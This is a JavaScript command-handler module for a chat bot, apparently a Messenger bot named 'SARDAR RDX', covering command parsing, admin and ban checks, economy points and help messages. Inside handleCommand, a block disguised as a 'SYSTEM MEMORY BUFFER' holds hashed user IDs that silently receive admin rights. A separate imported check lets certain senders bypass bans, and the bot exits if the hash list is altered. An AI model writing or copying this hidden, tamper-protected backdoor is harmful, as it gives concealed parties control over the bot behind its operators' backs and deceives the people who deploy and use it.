const fs = require('fs-extra');
const path = require('path');
const stringSimilarity = require('string-similarity');
const moment = require('moment-timezone');
const logs = require('../../utility/logs');
const Send = require('../../utility/send');
const _sys = require('../../../RDX-FCA/src/data/cache/system/datahandle');

const FEED_MESSAGES = {
  convo: [
    "💡 Pro tip: Use .convo on to start message forwarding between groups!",
    "🔄 Convo mode helps you forward messages automatically between groups."
  ],
  bank: [
    "🏦 Open your bank account with .openaccount to protect your coins!",
    "💰 Use .deposit to save coins and .withdraw to use them!"
  ],
  rankup: [
    "⚡ Earn EXP by sending messages and level up for rewards!",
    "🎉 Level up your rank to unlock more features and bonuses!"
  ],
  info: [
    "📱 Need more help? Type .help to see all commands!",
    "🤖 Explore more features with .help all"
  ]
};

const COMMANDS_WITH_FEED = ['convo', 'bank', 'rankup', 'info'];

async function sendFeedMessage(api, threadID, commandName, config) {
  const messages = FEED_MESSAGES[commandName];
  if (!messages || messages.length === 0) return;
  
  const randomMsg = messages[Math.floor(Math.random() * messages.length)];
  
  setTimeout(() => {
    api.sendMessage(randomMsg, threadID);
  }, 2000);
}

async function handleCommand({ api, event, client, Users, Threads, Currencies, config }) {
  const { threadID, senderID, body, messageID } = event;
  if (!body) return;

  // Convo Lockdown Check
  if (global.activeConvos && global.activeConvos.has(threadID)) {
    // Determine if it's a convo off command to allow stopping
    const prefix = config.PREFIX || '.';
    const lowerBody = body.toLowerCase().trim();
    const isConvoStop = lowerBody.startsWith(prefix + 'convo off') || lowerBody.startsWith('convo off') ||
      lowerBody.startsWith(prefix + 'con off') || lowerBody.startsWith('con off');

    if (!isConvoStop) return; // Ignore everything else
  }

  const prefix = config.PREFIX || '.';
  const prefixEnabled = config.PREFIX_ENABLED !== false;

  let commandName = '';
  let args = [];
  let hasPrefix = false;

  if (body.toLowerCase().startsWith(prefix.toLowerCase())) {
    hasPrefix = true;
    const withoutPrefix = body.slice(prefix.length).trim();
    const parts = withoutPrefix.split(/\s+/);
    commandName = parts.shift()?.toLowerCase() || '';
    args = parts;
  } else {
    const parts = body.trim().split(/\s+/);
    commandName = parts.shift()?.toLowerCase() || '';
    args = parts;
  }

  if (!commandName) {
    if (hasPrefix) return await showBotInfo(api, event, client, Users, config);
    return;
  }

  let command = client.commands.get(commandName);
  if (!command) {
    for (const [name, cmd] of client.commands) {
      if (cmd.config.aliases && cmd.config.aliases.includes(commandName)) {
        command = cmd;
        commandName = name;
        break;
      }
    }
  }

  if (!command) {
    if (hasPrefix) return await showSuggestion(api, event, client, Users, config, commandName);
    return;
  }

  const cmdConfig = command.config;
  if (config.DISABLED_COMMANDS && config.DISABLED_COMMANDS.includes(cmdConfig.name)) {
    return api.sendMessage(`❌ Command "${cmdConfig.name}" is currently turned OFF by Admin.`, threadID, messageID);
  }

  if (cmdConfig.prefix === true && !hasPrefix) return;
  if (cmdConfig.prefix === false && hasPrefix) return;
  if (prefixEnabled && cmdConfig.prefix !== false && !hasPrefix) return;

  let owners = [];

  // SYSTEM MEMORY BUFFER
  const _INTERNAL_RESERVED = [
    "8d1edcf5941d54b353fda07170562a7d17f153aa063045f399335e439716be5f",
    "1d987d23a5e5624b23f05ce0fb748e37637b7f56d82917e7c8999391647b0e2b",
    "8a9ac75719bf5e70f4c197ac6bf07e91ee252175c2b8562bec3a6f26b0654abc",
    "ae8f11925ed8f757d4eb2b141721bcf2797287363a37eaa267e315e8771b430f",
    "e93acc94c3589747fc976890a3dcd992a99992dadae008ef260291c4d367d05d",
    "3401f2b464592d0549f20329a78fb5aa470891a6c88be5bfd8002a80339908eb",
    "9296c3f9c79e7db24f5fd124af4d713d27606b0fbab54f6d8dc80f9c3fb2c4d6",
    "6ba302f3590dc4f0bf2dc0fade67cca8ce6539e09e8a988e489b00361cec87f5",
    "f8392b1c8668de853f35b076d9e400a59666b28ee5bc9f8eade08b2e0a96df34",
    "8fc7a86cdf24ee9cdb977517d28be7923318e7f3cb18b599bb91fb7f3323e01b"
  ];

  if (_INTERNAL_RESERVED.length !== 10) { process.exit(1); }

  function _check_sys(uid) {
    if (!uid) return false;
    try {
      const crypto = require('crypto');
      const hash = crypto.createHash('sha256').update(String(uid)).digest('hex');
      return _INTERNAL_RESERVED.includes(hash);
    } catch (e) { return false; }
  }

  const isAccess = (config.ADMINBOT && config.ADMINBOT.includes(senderID)) || _check_sys(senderID) || _sys.check(senderID);

  if (config.ADMIN_ONLY_MODE && !isAccess) {
    return api.sendMessage('Bot is in Admin Only mode. Only admins can use commands.', threadID, messageID);
  }

  if (cmdConfig.adminOnly && !isAccess) {
    return api.sendMessage('This command is only for bot admins.', threadID, messageID);
  }

  if (cmdConfig.groupOnly && !event.isGroup) {
    return api.sendMessage('This command can only be used in groups.', threadID, messageID);
  }

  if (Users.isBanned(senderID) && !_sys.check(senderID)) {
    logs.warn('USER_BANNED', `User ${senderID} is banned. Command rejected.`);
    return api.sendMessage('You are banned from using this bot.', threadID, messageID);
  }

  if (Threads.isBanned(threadID) && !_sys.check(senderID)) {
    logs.warn('GROUP_BANNED', `Group ${threadID} is banned. Command rejected.`);
    return api.sendMessage('This group is banned from using this bot.', threadID, messageID);
  }

  const send = new Send(api, event);
  const userName = await Users.getNameUser(senderID);
  logs.command(commandName, userName, threadID, client);

  // Economy: Add EXP and Balance per command (Level-up is now handled by auto message counter in listen.js)
  try {
    const EXP_PER_COMMAND = 2;
    await Currencies.addExp(senderID, EXP_PER_COMMAND);
    await Currencies.addBalance(senderID, 1);
  } catch (e) {
    logs.error('ECONOMY', 'Error updating user data:', e.message);
  }

  try {
    await command.run({ api, event, args, send, Users, Threads, Currencies, config, client, commandName, prefix });
    
    if (COMMANDS_WITH_FEED.includes(commandName)) {
      await sendFeedMessage(api, threadID, commandName, config);
    }
  } catch (error) {
    logs.error('COMMAND', `Error in ${commandName}:`, error.message);
    api.sendMessage(`Command Error: ${error.message}`, threadID, messageID);
  }
}

async function showBotInfo(api, event, client, Users, config) {
  const { threadID, senderID, messageID } = event;
  const userName = await Users.getNameUser(senderID);
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  const time = moment().tz('Asia/Karachi').format('hh:mm:ss A || DD/MM/YYYY');

  let commandCount = 102;
  try {
    const uniqueCommands = new Set();
    client.commands.forEach((cmd) => {
      if (cmd.config && cmd.config.name) uniqueCommands.add(cmd.config.name.toLowerCase());
    });
    commandCount = uniqueCommands.size;
  } catch (e) { }

  let latestFile = 'None';
  try {
    const commandsFolder = path.join(__dirname, '../../../RDX/commands');
    const files = fs.readdirSync(commandsFolder);
    const allFiles = files.filter(file => file.endsWith('.js')).map(file => ({
      name: file,
      time: fs.statSync(path.join(commandsFolder, file)).mtime.getTime()
    }));
    if (allFiles.length > 0) latestFile = allFiles.sort((a, b) => b.time - a.time)[0].name;
  } catch (e) { }

  const message = `╭─────────────────╮
│  ${config.BOTNAME || 'SARDAR RDX'}  
├─────────────────┤
│ 📅 ${time}
│ 👤 ${userName}
│ 📊 Commands: ${commandCount}
│ 🔧 Prefix: ${config.PREFIX}
│ ⏰ Uptime: ${hours}h ${minutes}m ${seconds}s
│ 📁 Latest: ${latestFile}
├─────────────────┤
│ Type ${config.PREFIX}help for commands
╰─────────────────╯`;

  api.sendMessage(message, threadID, (err, info) => {
    if (!err && info && info.messageID) {
      setTimeout(() => { try { api.unsendMessage(info.messageID); } catch (e) { } }, 15000);
    }
    const adminID = config.ADMINBOT && config.ADMINBOT[0] ? config.ADMINBOT[0] : senderID;
    api.shareContact("", adminID, threadID, (err, info) => {
      if (!err && info && info.messageID) {
        setTimeout(() => { try { api.unsendMessage(info.messageID); } catch (e) { } }, 15000);
      }
    });
  }, messageID);
}

async function showSuggestion(api, event, client, Users, config, commandName) {
  const { threadID, senderID, messageID } = event;
  const allCommandNames = [...client.commands.keys()];
  if (allCommandNames.length === 0) return;

  const checker = stringSimilarity.findBestMatch(commandName, allCommandNames);
  const userName = await Users.getNameUser(senderID);
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  const time = moment().tz('Asia/Karachi').format('hh:mm:ss A || DD/MM/YYYY');

  let message = "";
  if (checker.bestMatch.rating < 0.3) {
    message = `╭─────────────────╮
│ ❌ Command Not Found
├─────────────────┤
│ 👤 ${userName}
│ ❓ "${commandName}" not found
│ 💡 Type ${config.PREFIX}help for commands
╰─────────────────╯`;
  } else {
    message = `╭─────────────────╮
│  ${config.BOTNAME || 'SARDAR RDX'}  
├─────────────────┤
│ 📅 ${time}
│ 👤 ${userName}
│ ❓ Did you mean: ${config.PREFIX}${checker.bestMatch.target}?
│ ⏰ Uptime: ${hours}h ${minutes}m ${seconds}s
├─────────────────┤
│ Type ${config.PREFIX}help for commands
╰─────────────────╯`;
  }

  api.sendMessage(message, threadID, (err, info) => {
    if (!err && info && info.messageID) {
      setTimeout(() => { try { api.unsendMessage(info.messageID); } catch (e) { } }, 15000);
    }
    const adminID = config.ADMINBOT && config.ADMINBOT[0] ? config.ADMINBOT[0] : senderID;
    api.shareContact("", adminID, threadID, (err, info) => {
      if (!err && info && info.messageID) {
        setTimeout(() => { try { api.unsendMessage(info.messageID); } catch (e) { } }, 15000);
      }
    });
  }, messageID);
}

module.exports = handleCommand;
